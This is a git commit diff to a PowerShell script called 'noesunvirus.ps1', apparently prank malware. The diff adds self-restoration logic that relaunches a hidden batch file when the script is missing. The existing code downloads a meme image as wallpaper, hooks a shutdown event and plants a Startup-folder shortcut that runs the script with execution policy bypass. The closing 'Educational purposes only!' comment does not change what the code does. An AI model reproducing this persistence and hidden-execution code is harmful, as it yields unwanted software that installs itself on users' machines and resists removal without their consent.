216415181a0f8ffe6f9e5b07e91fb37cb517a572
notthecoolguyyouknow <9omxzzh1@duck.com>
2024-09-26 20:40:36 -0300

    w shi

--- noesunvirus.ps1
+++ noesunvirus.ps1
@@ -1,7 +1,30 @@
+$scriptPath1 = "$env:userprofile\Downloads\noesunvirus.ps1"
+$scriptPath2 = "$env:userprofile\Documents\noesunvirus.ps1"
+$scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1"
+$batFilePath = "$env:userprofile\Downloads\MonitorAndRestoreScript.bat"
+
+function Get-ScriptPath {
+    if (Test-Path $scriptPath1) {
+        return $scriptPath1
+    } elseif (Test-Path $scriptPath2) {
+        return $scriptPath2
+    } elseif (Test-Path $scriptPath3) {
+        return $scriptPath3
+    } else {
+        return $null
+    }
+}
+
+$scriptPath = Get-ScriptPath
+
+if ($null -eq $scriptPath) {
+    Write-Host "Script not found in any of the expected locations. Running batch file to restore."
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batFilePath`"" -WindowStyle Hidden
+    exit
+}
+
 $imagePath = "$env:userprofile\Pictures\background.jpg"
-
 $imageUrl = "https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonkler.jpg"
-
 Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
 
 Add-Type -TypeDefinition @"
@@ -23,8 +46,6 @@ Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
     Show-ImageMessage
 }
 
-$scriptPath = "$env:userprofile\Downloads\noesunvirus.ps1"
-
 $startupShortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\SetWallpaper.lnk"
 
 if (-not (Test-Path $startupShortcutPath)) {
@@ -34,5 +55,7 @@ if (-not (Test-Path $startupShortcutPath)) {
     $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
     $shortcut.Save()
 
-    Copy-Item $MyInvocation.MyCommand.Path $scriptPath
+    Copy-Item $MyInvocation.MyCommand.Path $scriptPath1
 }
+
+# Educational purposes only!
